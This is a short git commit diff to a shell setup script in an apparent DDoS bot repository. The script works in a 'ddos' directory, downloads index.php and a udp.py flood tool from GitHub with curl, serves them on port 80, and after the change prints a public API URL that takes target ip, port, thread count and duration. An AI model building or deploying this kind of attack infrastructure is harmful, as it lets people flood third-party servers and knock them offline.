95320626379981c5cd1649bc85b3e16164a6921b
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-07 19:34:22 +0700

    up

--- bot/setup.sh
+++ bot/setup.sh
@@ -7,5 +7,5 @@ cd ddos
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/udp.py -o udp.py
 screen -dmS ddos php -S 0.0.0.0:80
-ip_server=$(hostname -I)
-echo "Setup Success IP Server: $ip_server"
+ip_server=$(curl -s ifconfig.me)
+echo "Setup Success, API: http://$ip_server/?ip=1.1.1.1&port=80&thread=100&time=100"
